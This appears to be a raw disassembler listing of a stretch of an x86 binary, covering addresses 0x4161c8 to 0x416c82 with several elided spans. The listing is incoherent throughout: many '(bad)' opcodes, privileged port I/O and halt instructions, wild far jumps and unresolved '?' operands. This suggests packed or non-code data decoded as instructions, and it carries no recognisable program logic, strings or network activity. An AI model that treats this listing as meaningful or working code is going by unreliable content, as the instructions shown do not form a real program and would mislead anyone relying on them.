  4161c8:	bound  ebx,QWORD PTR [eax+0x4c5c7c88]
  4161ce:	xchg   ecx,eax
  4161cf:	jnp    0x4161d4
  4161d1:	pop    ebp
  4161d3:	dec    edx
  4161d4:	jns    0x41621d
  4161d6:	adc    DWORD PTR [esi-0x73],ecx
  4161d9:	add    ch,ch
  4161db:	je     0x4161af
  4161dd:	lss    ebx,FWORD PTR [esi-0x4e7cf3e8]
  4161e4:	mov    al,ds:0x9d8649e3
  4161e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161ea:	cli    
  4161eb:	dec    edi
  4161ec:	adc    bh,BYTE PTR [edi-0x11]
  4161ef:	add    cl,BYTE PTR ds:0x9d0440ca
  4161f5:	xor    DWORD PTR [edi+0x5e],esi
  4161f8:	xchg   ebx,eax
  4161f9:	iret   
  4161fa:	mov    ebx,0xf4f1bf43
  4161ff:	ret    0xa6e7
  416202:	ret    0xf07f
  416205:	bound  eax,QWORD PTR [esi-0x23cb2e3f]
  41620b:	mov    cl,0x7d
  41620d:	mov    DWORD PTR [ebx+0x489c168d],0xb2f0b9b3
  416217:	bound  edi,QWORD PTR [eax+0x46ca9572]
  41621d:	shr    cl,1
  41621f:	add    esp,DWORD PTR [edx-0xe]
  416222:	and    bh,BYTE PTR [edi+ebx*8]
  416225:	lock cs nop
  416228:	push   ebp
  416229:	sbb    DWORD PTR [ecx],edx
  41622b:	sub    BYTE PTR [esi+0x3d921db8],ah
  416231:	dec    eax
  416232:	pop    edi
  416233:	mov    ch,BYTE PTR [edx]
	...
  416295:	add    BYTE PTR [ebx],ah
  416297:	outs   dx,BYTE PTR ds:[esi]
  416298:	xor    ah,BYTE PTR ds:0x6e377d7f
  41629e:	test   BYTE PTR [esi+0x29c5f6de],bh
  4162a4:	adc    BYTE PTR [edi-0x6b],ah
  4162a7:	out    0x0,eax
  4162a9:	add    BYTE PTR [edi],al
  4162ab:	add    DWORD PTR [eax],eax
  4162ad:	add    BYTE PTR [eax-0x7ffb01e5],dh
  4162b3:	or     DWORD PTR [ebp+0x2945e789],0x17
  4162ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162bb:	mov    ds:0xde69b2c4,eax
  4162c0:	and    DWORD PTR [esi+0x768533d5],0xe953d317
  4162ca:	xchg   edi,eax
  4162cb:	aaa    
  4162cc:	and    eax,0x634bdd0f
  4162d1:	leave  
  4162d2:	test   eax,0x533d83c1
  4162d7:	inc    esp
  4162d8:	cdq    
  4162d9:	inc    ebp
  4162da:	mov    WORD PTR [ebx],?
  4162dc:	ins    DWORD PTR es:[edi],dx
  4162dd:	add    eax,0x68499464
  4162e2:	jge    0x416277
  4162e4:	aam    0x89
  4162e6:	aaa    
  4162e7:	xchg   ebp,eax
  4162e8:	and    eax,0xc04bc1d5
  4162ed:	les    ecx,FWORD PTR [ebx-0x399f883c]
  4162f3:	push   cs
  4162f4:	ret    0x174d
  4162f7:	dec    edi
  4162f8:	daa    
  4162f9:	cli    
  4162fa:	js     0x41634b
  4162fc:	daa    
  4162fd:	fiadd  WORD PTR [esi]
  4162ff:	xor    al,0xb3
  416301:	sbb    DWORD PTR [ecx+edx*2-0xf],eax
  416305:	lahf   
  416306:	mov    eax,ds:0x5b2abda2
  41630b:	xchg   esp,eax
  41630c:	scas   eax,DWORD PTR es:[edi]
  41630d:	out    0x31,al
  41630f:	jmp    0x416344
  416311:	in     al,0x41
  416313:	adc    dl,BYTE PTR [ebx-0x4201976d]
  416319:	leave  
  41631a:	push   esp
  41631b:	mov    dl,0x50
  41631d:	les    ecx,FWORD PTR [edx]
  41631f:	xor    BYTE PTR [edx],ah
  416321:	cdq    
  416322:	les    ebp,FWORD PTR [edx+0x34e00fb8]
  416328:	pop    eax
  416329:	mov    dl,0x13
  41632b:	mov    edx,0xe4431524
  416330:	push   0x5d
  416332:	adc    dh,BYTE PTR [ecx]
  416334:	jno    0x416343
  416336:	rcl    DWORD PTR ds:0xee7dfa06,cl
  41633c:	push   ss
  41633d:	aam    0x34
  41633f:	mov    edi,0x22d66d1c
  416344:	sti    
  416345:	pop    ecx
  416346:	hlt    
  416347:	pop    edx
  416348:	leave  
  416349:	pushf  
  41634a:	cli    
  41634b:	and    eax,DWORD PTR [ebx]
  41634d:	jns    0x4163ce
  41634f:	in     al,dx
  416350:	mov    cl,0xbe
  416352:	xchg   DWORD PTR [edx-0x5c],edi
  416355:	mov    ds,WORD PTR [edi-0xcbe191]
  41635b:	pushf  
  41635c:	pushf  
  41635d:	inc    edx
  41635e:	mov    al,ds:0xedfb8e08
  416363:	cmp    DWORD PTR [ebp-0x6eff8938],ebx
  416369:	inc    esi
  41636a:	xchg   DWORD PTR [esi+0x34c5b463],esi
  416370:	xchg   edi,eax
  416371:	outs   dx,DWORD PTR ds:[esi]
  416372:	adc    BYTE PTR [edi-0xc8f39a0],0x5a
  416379:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41637a:	cmp    al,0x1c
  41637c:	jb     0x4163c9
  41637e:	scas   al,BYTE PTR es:[edi]
  41637f:	sar    BYTE PTR [ecx],0x74
  416382:	lods   eax,DWORD PTR ds:[esi]
  416383:	jne    0x41638e
  416385:	push   edi
  416386:	into   
  416387:	pop    edi
  416388:	aas    
  416389:	stos   DWORD PTR es:[edi],eax
  41638a:	or     eax,0x5656f75
  41638f:	xor    eax,0x395074f4
  416394:	mov    ds:0xc1a1cf42,eax
  416399:	ds cs mov esp,0xe528f932
  4163a0:	mov    bh,0xf3
  4163a2:	cs (bad) 
  4163a5:	xchg   BYTE PTR [edi+edx*8],bl
  4163a8:	out    dx,al
  4163a9:	(bad)  
  4163aa:	sbb    eax,0xf950642c
  4163af:	mov    bx,0xb36e
  4163b3:	cli    
  4163b4:	or     al,0x0
	...
  416416:	repz inc ebx
  416418:	ror    cl,1
  41641a:	lock (bad) 
  41641d:	jnp    0x416481
  41641f:	xchg   esi,eax
  416420:	cmp    DWORD PTR [ebp-0x5954613c],edx
  416426:	pushf  
  416427:	call   0x148642c
  41642c:	add    BYTE PTR [eax],al
  41642e:	dec    esi
  41642f:	mov    dh,0x68
  416431:	mov    ss,ebx
  416433:	sahf   
  416434:	in     eax,dx
  416435:	cmc    
  416436:	(bad)  
  416437:	jno    0x4163f0
  416439:	popa   
  41643a:	gs mov edx,0x7119cb27
  416440:	xchg   edx,eax
  416441:	cmp    cl,ch
  416443:	shl    BYTE PTR [ecx-0x5d],cl
  416446:	mov    esp,0x452b9811
  41644b:	push   esi
  41644c:	add    BYTE PTR [ebx],bl
  41644e:	aas    
  41644f:	test   BYTE PTR [ebx],bl
  416451:	call   FWORD PTR [esi]
  416453:	mov    dl,0xc1
  416455:	and    edx,DWORD PTR [bp+di-0x73]
  416459:	test   eax,0x19d7c2f4
  41645e:	jmp    0x49e472f8
  416463:	cld    
  416464:	es scas eax,DWORD PTR es:[edi]
  416466:	add    eax,0xa0cfafd6
  41646b:	(bad)  
  41646c:	hlt    
  41646d:	sbb    eax,0x74dcc5fc
  416472:	mov    dh,0xfc
  416474:	lock sub eax,0x77b7aaa5
  41647a:	inc    edx
  41647b:	outs   dx,BYTE PTR ds:[esi]
  41647c:	fild   QWORD PTR [edi]
  41647e:	(bad)  
  41647f:	std    
  416480:	sbb    ebx,DWORD PTR [ecx]
  416482:	xor    al,ch
  416484:	lahf   
  416485:	(bad)
  416489:	bound  ecx,QWORD PTR [ecx-0x7b]
  41648c:	icebp  
  41648d:	loope  0x4164ed
  41648f:	mov    bl,0x9e
  416491:	sbb    ebx,edi
  416493:	push   esp
  416494:	stc    
  416495:	loope  0x416493
  416497:	bound  ebx,QWORD PTR [ecx]
  416499:	ds in  eax,dx
  41649b:	cs inc eax
  41649d:	inc    ecx
  41649e:	fcmove st,st(5)
  4164a0:	loopne 0x416518
  4164a2:	gs (bad) 
  4164a5:	cmp    eax,0x361d2d2e
  4164aa:	retf   0x5add
  4164ad:	xor    DWORD PTR [ebx-0x9cac3a4],0x6
  4164b4:	adc    DWORD PTR [edx+0x333812f0],ecx
  4164ba:	inc    esi
  4164bb:	dec    ebx
  4164bc:	scas   al,BYTE PTR es:[edi]
  4164bd:	xchg   ebp,eax
  4164be:	jne    0x41648b
  4164c0:	sub    al,BYTE PTR [edi+0x1e]
  4164c3:	call   0x37537045
  4164c8:	add    eax,DWORD PTR ds:0x6bd449ae
  4164ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164cf:	xor    bl,BYTE PTR [ecx]
  4164d1:	add    cl,BYTE PTR [edi+ebp*1+0x7a]
  4164d5:	mov    ds:0xea41761e,eax
  4164da:	cmp    eax,0xa6149ad4
  4164df:	add    ch,BYTE PTR [eax+0x6ec7885c]
  4164e5:	je     0x4164e3
  4164e7:	adc    ebp,esp
  4164e9:	sbb    ecx,DWORD PTR [ebp+0x36]
  4164ec:	lock ds call 0xc0a8492f
  4164f3:	add    BYTE PTR [ecx-0x1129554],cl
  4164f9:	cmp    al,0xd6
  4164fb:	ins    DWORD PTR es:[edi],dx
  4164fc:	inc    esi
  4164fd:	(bad)  
  4164fe:	cmc    
  4164ff:	mov    eax,ds:0xf316b0ae
  416504:	xchg   esp,eax
  416505:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416506:	or     al,bl
  416508:	test   DWORD PTR [esi+0x7a24f4e7],ebp
  41650e:	ins    DWORD PTR es:[edi],dx
  41650f:	(bad)  
  416510:	aad    0x77
  416512:	jmp    0x4164d0
  416514:	(bad)  
  416515:	jno    0x416538
  416517:	add    BYTE PTR [ebx+ebx*2],0xac
  41651b:	pushf  
  41651c:	or     eax,0x66254a87
  416521:	dec    ecx
  416522:	neg    dl
  416524:	push   cx
  416526:	fimul  WORD PTR [ebp+0x72]
  416529:	push   esi
  41652a:	mov    eax,0xdfcd50ed
  41652f:	push   ebx
  416530:	mov    dl,0x6f
  416532:	retf   0x8e37
	...
  416595:	add    BYTE PTR ds:0xfff32bd8,ah
  41659b:	repz std 
  41659d:	fisubr WORD PTR [edi+ebp*1+0x72]
  4165a1:	jno    0x416539
  4165a3:	pushf  
  4165a4:	aas    
  4165a5:	jmp    0x107:0xe9a3
  4165ac:	add    BYTE PTR [eax],al
  4165ae:	push   es
  4165af:	cmp    al,0x36
  4165b1:	call   0x69857ca0
  4165b6:	data16 adc al,0x76
  4165b9:	hlt    
  4165ba:	mov    al,0xd1
  4165bc:	fadd   QWORD PTR [ebx-0x23]
  4165bf:	lock add eax,0x27046779
  4165c5:	call   0x5829:0x30be6a5c
  4165cc:	inc    eax
  4165cd:	test   al,0x4f
  4165cf:	xchg   BYTE PTR [ecx+ebx*8+0x1b],dl
  4165d3:	ret    
  4165d4:	ins    BYTE PTR es:[edi],dx
  4165d5:	fisub  DWORD PTR [ecx+0x53]
  4165d8:	inc    ecx
  4165d9:	push   cs
  4165da:	mov    cl,0x14
  4165dc:	cld    
  4165dd:	jo     0x4165e3
  4165df:	inc    BYTE PTR [eax+eax*4+0x1cc61683]
  4165e6:	inc    ecx
  4165e7:	loopne 0x416581
  4165e9:	add    al,BYTE PTR [ebx+edx*4]
  4165ec:	scas   eax,DWORD PTR es:[edi]
  4165ed:	fdiv   QWORD PTR [ecx-0x71]
  4165f0:	adc    DWORD PTR [ebp+0x63],ecx
  4165f3:	in     eax,dx
  4165f4:	and    al,0x9f
  4165f6:	arpl   WORD PTR [ebx-0x6a],cx
  4165f9:	out    dx,al
  4165fa:	stos   BYTE PTR es:[edi],al
  4165fb:	mov    ebp,0x7ed4140c
  416600:	call   esp
  416602:	jbe    0x41658d
  416604:	jnp    0x5bcf710f
  41660a:	inc    ebx
  41660b:	sub    al,0xce
  41660d:	imul   edx,DWORD PTR [edi-0x67],0x41e48ce6
  416614:	xchg   BYTE PTR [ecx],dl
  416616:	sbb    ah,dh
  416618:	jge    0x41659c
  41661a:	xor    eax,0x4913a04b
  41661f:	test   al,0xd0
  416621:	mov    ds:0x5d172cbe,al
  416626:	mov    cl,0x5
  416628:	mov    dl,0x1
  41662a:	jae    0x4165c8
  41662c:	fiadd  WORD PTR [eax]
  41662e:	jl     0x416669
  416630:	mov    al,0x0
  416632:	sbb    edi,DWORD PTR cs:[ecx-0x7c]
  416636:	clc    
  416637:	jnp    0x4166a9
  416639:	mov    bh,0xdf
  41663b:	push   0x6befbc77
  416640:	xor    eax,0x5b1eafe2
  416645:	or     BYTE PTR [ebp+0x7cb8b4c4],0xd8
  41664c:	hlt    
  41664d:	pop    edx
  41664e:	add    BYTE PTR [edx],ch
  416650:	sbb    eax,0xffffff84
  416653:	cmp    BYTE PTR [edi+ebp*2+0x6962978e],ah
  41665a:	out    0xba,eax
  41665c:	push   ss
  41665d:	mov    edx,0x1823dc39
  416662:	(bad)  
  416663:	dec    edi
  416664:	adc    eax,0x3835d03c
  416669:	push   edx
  41666a:	dec    ebp
  41666b:	les    edx,FWORD PTR [ebx]
  41666d:	pop    eax
  41666e:	sub    al,bl
  416670:	jns    0x416605
  416672:	ficomp DWORD PTR [ebp+0x3ccc0ccf]
  416678:	arpl   WORD PTR [ecx],dx
  41667a:	mov    dh,0x3
  41667c:	cmp    al,0x76
  41667e:	out    dx,al
  41667f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416680:	hlt    
  416681:	popf   
  416682:	adc    ecx,ebp
  416684:	xchg   edi,eax
  416685:	and    eax,0x72a3e351
  41668a:	or     ebx,esp
  41668c:	and    BYTE PTR [eax+0x47d2ced0],dh
  416692:	and    ebp,eax
  416694:	jle    0x41661b
  416696:	test   eax,0x8655e790
  41669b:	or     bl,dl
  41669d:	in     eax,dx
  41669e:	fcomp  DWORD PTR [ecx+0x5c]
  4166a1:	xor    BYTE PTR [ecx-0x523a95e7],ch
  4166a7:	push   edi
  4166a8:	test   esi,0x3d380c25
  4166ae:	out    dx,eax
  4166af:	mov    ebx,ebx
  4166b1:	mov    esp,0x71376
	...
  416716:	(bad)  
  416717:	(bad)  
  416719:	(bad)  
  41671a:	(bad)  
  41671c:	out    0xff,eax
  41671e:	mov    ah,0x10
  416720:	mov    cl,0x4f
  416722:	jnp    0x416723
  416724:	adc    al,0xe4
  416726:	stos   BYTE PTR es:[edi],al
  416727:	jmp    0x0:0x1070000
  41672e:	xor    al,0x1b
  416730:	in     al,0x3f
  416732:	mov    al,ds:0xa206c85d
  416737:	pop    ecx
  416738:	adc    BYTE PTR [eax+0x28cbdf48],al
  41673e:	stc    
  41673f:	mov    esi,0xb2df3267
  416744:	daa    
  416745:	aaa    
  416746:	mov    eax,ds:0xa05c375c
  41674b:	xor    BYTE PTR [eax-0x63bbdfa],bh
  416751:	jle    0x416700
  416753:	fisubr DWORD PTR [eax]
  416755:	enter  0x9a3a,0x4e
  416759:	ret    0x314a
  41675c:	dec    ebp
  41675d:	(bad)  
  41675f:	sub    BYTE PTR [edx+0x46],dl
  416762:	adc    ah,BYTE PTR [ecx]
  416764:	jmp    0x57355f34
  416769:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41676a:	xchg   ebp,eax
  41676b:	arpl   WORD PTR [edi-0x74],bx
  41676e:	arpl   cx,si
  416770:	pop    ecx
  416771:	adc    BYTE PTR [esi],bh
  416773:	fild   WORD PTR [edi-0x5924874b]
  416779:	xor    esi,edx
  41677b:	das    
  41677c:	ret    
  41677d:	dec    ebp
  41677e:	leave  
  41677f:	imul   eax,DWORD PTR [eax+0x67f75730],0x6
  416786:	jmp    0x906d34f9
  41678b:	mov    bl,0x16
  41678d:	jmp    0xf4f1:0x1b92b50b
  416794:	jmp    0x22b18c18
  416799:	inc    ebx
  41679a:	call   0xa49:0x76a06e78
  4167a1:	dec    edx
  4167a2:	add    al,0x24
  4167a4:	add    ax,0x8db1
  4167a8:	mov    esp,0x71bfbda4
  4167ad:	(bad)  [ecx]
  4167af:	dec    ebp
  4167b0:	push   ebx
  4167b1:	jmp    FWORD PTR [eax-0x784dda7]
  4167b7:	arpl   WORD PTR [edx+0x51],dx
  4167ba:	xchg   ebp,eax
  4167bb:	mov    DWORD PTR [edx],edi
  4167bd:	out    0xe2,eax
  4167bf:	retf   0xd370
  4167c2:	mov    dl,0x1a
  4167c4:	ja     0x41680b
  4167c6:	pop    esi
  4167c7:	or     dh,bh
  4167c9:	push   ecx
  4167ca:	inc    BYTE PTR [edi+0x5437894e]
  4167d0:	mov    ds:0x1ad20789,al
  4167d5:	mov    edi,0x33e11c4f
  4167da:	dec    ebx
  4167db:	or     edx,DWORD PTR [edx]
  4167dd:	sub    DWORD PTR [edi-0x37297224],esi
  4167e3:	ret    0x466c
  4167e6:	pop    es
  4167e7:	xor    eax,edi
  4167e9:	popa   
  4167ea:	outs   dx,BYTE PTR ds:[esi]
  4167eb:	dec    ebp
  4167ec:	jl     0x41683d
  4167ee:	fld    QWORD PTR [ebx]
  4167f0:	out    dx,al
  4167f1:	mov    dh,0x3d
  4167f3:	repz bound eax,QWORD PTR [eax]
  4167f6:	fsubr  st,st(4)
  4167f8:	cld    
  4167f9:	xchg   edi,eax
  4167fa:	ret    
  4167fb:	mov    esp,0x956d4b84
  416800:	jmp    0x749f1ffb
  416805:	test   esi,esi
  416807:	mov    ebx,0x77e0aa07
  41680c:	cs loop 0x416872
  41680f:	jbe    0x416857
  416811:	ins    DWORD PTR es:[edi],dx
  416812:	aas    
  416813:	jo     0x416887
  416815:	xlat   BYTE PTR ds:[ebx]
  416816:	out    0x25,eax
  416818:	imul   DWORD PTR ds:0xee4f
  41681d:	push   es
  41681e:	pop    ds
  41681f:	inc    ecx
  416820:	mov    ds:0x98057e3d,al
  416825:	mov    al,ds:0xb3ed89c8
  41682a:	sub    BYTE PTR [esi+0x1deba514],ah
  416830:	imul   esp,ebx,0x6f1f4
	...
  416896:	shr    DWORD PTR [edi-0x4810cfa],1
  41689c:	cmc    
  41689d:	scas   eax,DWORD PTR es:[edi]
  41689e:	cwde   
  41689f:	sub    bh,al
  4168a1:	repnz dec esi
  4168a3:	pusha  
  4168a4:	aam    0x4e
  4168a6:	mov    cl,0xeb
  4168a8:	add    BYTE PTR [eax],al
  4168aa:	pop    es
  4168ab:	add    DWORD PTR [eax],eax
  4168ad:	add    BYTE PTR [eax-0x20b165b3],ch
  4168b3:	lea    edi,[eax]
  4168b5:	pop    edx
  4168b6:	mov    edi,0x7ed611b7
  4168bb:	pop    edx
  4168bc:	lods   eax,DWORD PTR ds:[esi]
  4168bd:	add    DWORD PTR [ebx+0x72150a1e],ebp
  4168c3:	fcom   DWORD PTR [esi]
  4168c5:	mov    esp,0xb05205c4
  4168ca:	mov    ebx,0x1d6511ba
  4168cf:	pop    ecx
  4168d0:	jmp    0x844:0xe626ae55
  4168d7:	jbe    0x41693d
  4168d9:	daa    
  4168da:	cwde   
  4168db:	xor    al,0xf7
  4168dd:	and    al,0x60
  4168df:	test   bh,dl
  4168e1:	cmp    DWORD PTR [edi-0x4e30cab7],ecx
  4168e7:	pop    ss
  4168e8:	mov    ebx,0x1e5214bc
  4168ed:	pushf  
  4168ee:	xor    eax,0x1400b29b
  4168f3:	pop    esi
  4168f4:	ds sti 
  4168f6:	hlt    
  4168f7:	xchg   ecx,eax
  4168f8:	push   edi
  4168f9:	xchg   ecx,eax
  4168fa:	and    al,0x4a
  4168fc:	aam    0xbd
  4168fe:	sti    
  4168ff:	lock mov esp,0x9adf17d2
  416905:	or     BYTE PTR [eax+0x41],bl
  416908:	sbb    eax,0x98de684b
  41690d:	xchg   esp,eax
  41690e:	cli    
  41690f:	shl    cl,0xea
  416912:	and    BYTE PTR [ebx-0x812492f],bh
  416918:	jecxz  0x41691a
  41691a:	xor    eax,0x758447ee
  41691f:	les    esi,FWORD PTR [edx+0x209f8ed7]
  416925:	mov    al,ds:0x28fb126d
  41692a:	fmul   QWORD PTR [edx-0x38204935]
  416930:	inc    ecx
  416931:	adc    eax,0x3bb2cab1
  416936:	inc    ecx
  416937:	ins    DWORD PTR es:[edi],dx
  416938:	mov    ecx,0x941ebcdb
  41693d:	aaa    
  41693e:	mov    edi,DWORD PTR [edi-0x2848f4ce]
  416944:	clc    
  416945:	add    DWORD PTR [edi],edx
  416947:	push   ss
  416948:	push   esp
  416949:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41694a:	adc    DWORD PTR [eax],0x1e
  41694d:	mov    ds:0xfa48f809,al
  416952:	fwait
  416953:	pop    ecx
  416954:	inc    edi
  416955:	jnp    0x41697c
  416957:	mov    esi,0xc630dace
  41695c:	push   ebp
  41695d:	(bad)
  416960:	and    al,0x9d
  416962:	and    BYTE PTR [eax],bl
  416964:	push   edi
  416965:	xor    al,0x81
  416967:	cli    
  416968:	jne    0x416993
  41696a:	test   eax,0xd03b5c97
  41696f:	adc    al,0x7d
  416971:	jns    0x4169c0
  416973:	dec    edi
  416974:	in     eax,dx
  416975:	cmp    DWORD PTR [edi],ecx
  416977:	sub    cl,BYTE PTR [ecx+0x6b555cc1]
  41697d:	pushf  
  41697e:	jb     0x41698b
  416980:	cmp    eax,0xaa1d4eb4
  416985:	(bad)  
  416987:	push   ebx
  416988:	in     al,dx
  416989:	sub    bl,BYTE PTR ss:[eax]
  41698c:	mov    ds:0x44bbf547,eax
  416991:	push   ebx
  416992:	lods   eax,DWORD PTR ds:[esi]
  416993:	cmp    al,0x4b
  416995:	outs   dx,DWORD PTR ds:[esi]
  416996:	dec    esi
  416997:	lds    eax,FWORD PTR [bp+si-0x67f1]
  41699c:	stos   BYTE PTR es:[edi],al
  41699d:	adc    eax,0x2985c4e4
  4169a2:	and    al,0x5d
  4169a4:	pusha  
  4169a5:	jmp    0x6bae011d
  4169aa:	call   0x168d:0xe1844d6e
  4169b1:	aaa    
  4169b2:	sbb    BYTE PTR [edi],0x9c
	...
  416a15:	add    bl,cl
  416a17:	pusha  
  416a18:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416a1e:	enter  0x4aea,0x13
  416a22:	shr    BYTE PTR [ebx+edi*8],cl
  416a25:	in     eax,dx
  416a26:	mov    eax,0x70000ec
  416a2b:	add    DWORD PTR [eax],eax
  416a2d:	add    BYTE PTR [ebp+edx*8+0x17a9878],dl
  416a34:	sti    
  416a35:	sub    al,0x81
  416a37:	or     al,0x54
  416a39:	inc    ebp
  416a3a:	dec    BYTE PTR [esi+0x39ca7d32]
  416a40:	push   ds
  416a41:	sbb    eax,0xc3467bf2
  416a46:	out    dx,al
  416a47:	jns    0x416a0f
  416a49:	daa    
  416a4a:	test   al,0x91
  416a4c:	cmp    eax,0xb4fc8e6c
  416a51:	lea    ebp,[edi+0x5d]
  416a54:	inc    edx
  416a55:	cdq    
  416a56:	cmc    
  416a57:	in     eax,0xde
  416a59:	add    al,0xf7
  416a5b:	mov    ?,edi
  416a5d:	fld1   
  416a5f:	adc    DWORD PTR [ecx],0xfffffff4
  416a62:	pop    edi
  416a63:	push   ss
  416a64:	mov    al,0xfd
  416a66:	retf   0x61d
  416a69:	mov    eax,0x26dce383
  416a6e:	js     0x416adc
  416a70:	lea    eax,[edx+0x5b70350f]
  416a76:	mov    ds:0x7232140b,eax
  416a7b:	daa    
  416a7c:	arpl   ax,sp
  416a7e:	inc    eax
  416a7f:	adc    BYTE PTR [ecx-0x7c],bh
  416a82:	fcomp  QWORD PTR [edi+0x445af826]
  416a88:	xor    ch,BYTE PTR [edx]
  416a8a:	stos   DWORD PTR es:[edi],eax
  416a8b:	mov    eax,DWORD PTR [ebx-0x6]
  416a8e:	dec    eax
  416a8f:	icebp  
  416a90:	js     0x416a7a
  416a92:	shr    DWORD PTR [eax],1
  416a94:	mov    ebx,0x975f1659
  416a99:	aad    0x6e
  416a9b:	imul   edx,DWORD PTR [esi],0xf490a091
  416aa1:	adc    al,0x1d
  416aa3:	push   ds
  416aa4:	ins    DWORD PTR es:[edi],dx
  416aa5:	mov    ebx,0x44bb4bfd
  416aaa:	sahf   
  416aab:	sahf   
  416aac:	hlt    
  416aad:	mov    al,ds:0x62067b2e
  416ab2:	stc    
  416ab3:	push   ebp
  416ab4:	fwait
  416ab5:	and    eax,0xe778af6a
  416aba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416abb:	mov    eax,0xb1a52e54
  416ac0:	stc    
  416ac1:	out    0x7f,al
  416ac3:	div    DWORD PTR [eax+0x4c00b69f]
  416ac9:	dec    edx
  416aca:	push   ds
  416acb:	popa   
  416acc:	fbstp  TBYTE PTR [esp+esi*1]
  416acf:	dec    ecx
  416ad0:	mov    edi,0x3ccc99c6
  416ad5:	pop    esi
  416ad6:	stos   BYTE PTR es:[edi],al
  416ad7:	sbb    DWORD PTR [edx-0x506839f3],0x6fc95979
  416ae1:	js     0x416b27
  416ae3:	xchg   edi,eax
  416ae4:	mov    edx,0xc62751f5
  416ae9:	fdivr  QWORD PTR [edx]
  416aeb:	retf   0xaa3f
  416aee:	aas    
  416aef:	mov    ?,WORD PTR [esi]
  416af1:	rol    DWORD PTR [edx+0x5b7e37b],0xa1
  416af8:	fisubr WORD PTR [eax+0x50]
  416afb:	push   ecx
  416afc:	(bad)  
  416afd:	pushf  
  416afe:	bound  ebx,QWORD PTR [ebp+0x38cf35f0]
  416b04:	aaa    
  416b05:	popa   
  416b06:	mov    edi,DWORD PTR [ebx]
  416b08:	loop   0x416ae1
  416b0a:	(bad)  
  416b0c:	sar    BYTE PTR [esi-0x9],1
  416b0f:	pandn  mm7,QWORD PTR [eax-0x7]
  416b13:	xor    al,0x8e
  416b15:	sub    BYTE PTR [ebp-0x4a61858b],al
  416b1b:	xchg   esp,eax
  416b1c:	push   ebx
  416b1d:	es scas al,BYTE PTR es:[edi]
  416b1f:	fst    st(7)
  416b21:	cmp    dl,BYTE PTR [eax-0x5b]
  416b24:	imul   ecx,ecx,0xffffff8a
  416b27:	bound  ebx,QWORD PTR [ebx+0x45]
  416b2a:	add    BYTE PTR [esp+eiz*2+0x605eb41a],bh
  416b31:	push   eax
  416b32:	sub    bh,BYTE PTR [ecx]
  416b34:	mov    ebx,0x0
	...
  416b95:	add    bl,ah
  416b97:	gs push cs
  416b99:	test   DWORD PTR [esi+0x1275fbff],0x74a56b6b
  416ba3:	xchg   BYTE PTR [ecx],dl
  416ba5:	jno    0x416b66
  416ba7:	in     eax,dx
  416ba8:	add    BYTE PTR [eax],al
  416baa:	pop    es
  416bab:	add    DWORD PTR [eax],eax
  416bad:	add    BYTE PTR [eax+0x7a],al
  416bb0:	test   eax,0xfb35aaa2
  416bb5:	fldcw  WORD PTR [edi]
  416bb7:	adc    al,0xa0
  416bb9:	lds    edx,FWORD PTR [eax]
  416bbb:	(bad)  
  416bbc:	sub    al,0x7c
  416bbe:	fwait
  416bbf:	in     eax,dx
  416bc0:	sbb    eax,0xf1b5fd4
  416bc5:	cmc    
  416bc6:	adc    ebp,DWORD PTR [edx-0x39]
  416bc9:	cdq    
  416bca:	out    0xb2,eax
  416bcc:	shl    BYTE PTR [esi+ecx*2],0x46
  416bd0:	jp     0x416bdc
  416bd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416bd3:	add    BYTE PTR [edi+0x28],0xdc
  416bd7:	fist   WORD PTR [edx+0x42297425]
  416bdd:	lods   al,BYTE PTR ds:[esi]
  416bde:	mov    WORD PTR ds:0x464955f3,ds
  416be4:	dec    edi
  416be5:	mov    esp,0xdcdb71c
  416bea:	dec    ebp
  416beb:	mov    bl,0x53
  416bed:	stos   BYTE PTR es:[edi],al
  416bee:	test   DWORD PTR [eax-0x2d],esi
  416bf1:	mov    edx,0xb9a42772
  416bf6:	int3   
  416bf7:	outs   dx,DWORD PTR ds:[esi]
  416bf8:	retf   
  416bf9:	(bad)  
  416bfa:	jne    0x416b8f
  416bfc:	xor    DWORD PTR [edi-0x40e1ec78],ebp
  416c02:	ror    BYTE PTR [eax-0x6fa37805],cl
  416c08:	sub    dl,0xae
  416c0b:	add    eax,ebx
  416c0d:	jge    0x416bbc
  416c0f:	les    edi,FWORD PTR [edi]
  416c11:	mov    al,ds:0x94c0b017
  416c16:	rcr    DWORD PTR [esi+ebp*4],cl
  416c19:	fxch   st(3)
  416c1b:	mov    bl,BYTE PTR [ebx]
  416c1d:	inc    edx
  416c1e:	dec    ebp
  416c1f:	xchg   esp,eax
  416c20:	sbb    al,0x32
  416c22:	ja     0x416bcc
  416c24:	in     al,dx
  416c25:	ror    DWORD PTR [ecx-0xe98bbd5],1
  416c2b:	test   ah,ch
  416c2d:	xchg   edi,eax
  416c2e:	inc    esp
  416c2f:	mov    ah,BYTE PTR [ebp+0x3bdd809f]
  416c35:	leave  
  416c36:	pop    edx
  416c37:	shl    BYTE PTR [ebx+0x1b49d522],0x73
  416c3e:	mov    DWORD PTR [edi+ecx*4-0x73fc26c6],ebx
  416c45:	outs   dx,DWORD PTR ds:[esi]
  416c46:	fcomi  st,st(1)
  416c48:	push   ss
  416c49:	sahf   
  416c4a:	and    DWORD PTR [ebp+0x54fc62a2],esp
  416c50:	add    eax,0xbbf4daad
  416c55:	mov    edi,edi
  416c57:	enter  0xea2f,0xf2
  416c5b:	out    0xe0,eax
  416c5d:	xor    DWORD PTR [ecx-0x1],edx
  416c60:	lds    ebx,FWORD PTR [edi]
  416c62:	xchg   ecx,eax
  416c63:	cwde   
  416c64:	push   edx
  416c65:	cmp    dl,bl
  416c67:	int3   
  416c68:	loope  0x416cd9
  416c6a:	test   BYTE PTR ds:0x971a2d62,ah
  416c70:	jge    0x416cf1
  416c72:	push   edx
  416c73:	jg     0x416ccd
  416c75:	aaa    
  416c76:	xchg   ebx,eax
  416c77:	cmp    al,0x9f
  416c79:	(bad)  
  416c7a:	jle    0x416c24
  416c7c:	test   al,0x99
  416c7e:	xor    al,0x55
  416c80:	jno    0x416c0e
  416c82:	test   al,0x4a
